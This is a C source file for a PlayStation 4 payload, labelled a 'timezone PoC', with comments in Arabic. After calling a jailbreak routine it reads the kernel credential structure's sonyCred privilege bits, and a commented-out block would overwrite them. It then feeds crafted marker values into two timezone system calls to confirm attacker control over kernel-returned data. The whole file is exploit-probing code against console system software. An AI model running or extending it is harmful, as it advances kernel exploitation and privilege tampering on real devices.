#include "ps4.h"

#define SYS_SET_TIMEZONE_INFO 636
#define SYS_UTC_TO_LOCALTIME  638

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone PoC ===\n");

    // تحقق من sonyCred مباشرة
    void* td_ucred = *(void**)(((char*)td) + 304);  // td + 0x130
    uint64_t sonyCred = *(uint64_t*)(((char*)td_ucred) + 96);  // ucred + 0x60
    printf_debug("sonyCred = 0x%lx\n", sonyCred);
    printf_debug("bit62 = %d\n", (int)((sonyCred >> 62) & 1));

    /* إذا bit62 = 0 → نضبطه يدوياً
    if (((sonyCred >> 62) & 1) == 0) {
        printf_debug("fixing bit62...\n");
        *(uint64_t*)(((char*)td_ucred) + 96) = 0xffffffffffffffff;
        sonyCred = *(uint64_t*)(((char*)td_ucred) + 96);
        printf_debug("sonyCred after = 0x%lx\n", sonyCred);
    }
    */
    static uint8_t data[512 * 16];
    memset(data, 0, sizeof(data));

    *(long*)(data + 0)  = 0x0;
    *(int*)(data  + 8)  = 0x41414141;
    *(int*)(data  + 12) = 0x42424242;

    *(long*)(data + 16) = 0x7FFFFFFF;
    *(int*)(data  + 24) = 0x43434343;
    *(int*)(data  + 28) = 0x44444444;

    struct {
        void*    ptr;
        uint32_t count;
    } set_args = {
        .ptr   = data,
        .count = 2
    };

    int r = syscall(SYS_SET_TIMEZONE_INFO, &set_args);
    printf_debug("set_timezone r=%d\n", r);

    if (r != 0) {
        printf_debug("[-] failed\n");
        return 0;
    }

    long result  = 0;
    int  dst_out = 0;

    struct {
        long  timestamp;
        long* out_time;
        void* out_info;
        int*  out_dst;
    } utc_args = {
        .timestamp = 0x1000,
        .out_time  = &result,
        .out_info  = NULL,
        .out_dst   = &dst_out,
    };

    r = syscall(SYS_UTC_TO_LOCALTIME, &utc_args);
    printf_debug("utc r=%d\n",       r);
    printf_debug("result=0x%lx\n",   result);

    long expected = 0x1000 + 0x41414141LL;
    if (result == expected) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    } else {
        printf_debug("expected=0x%lx\n", expected);
    }

    return 0;
}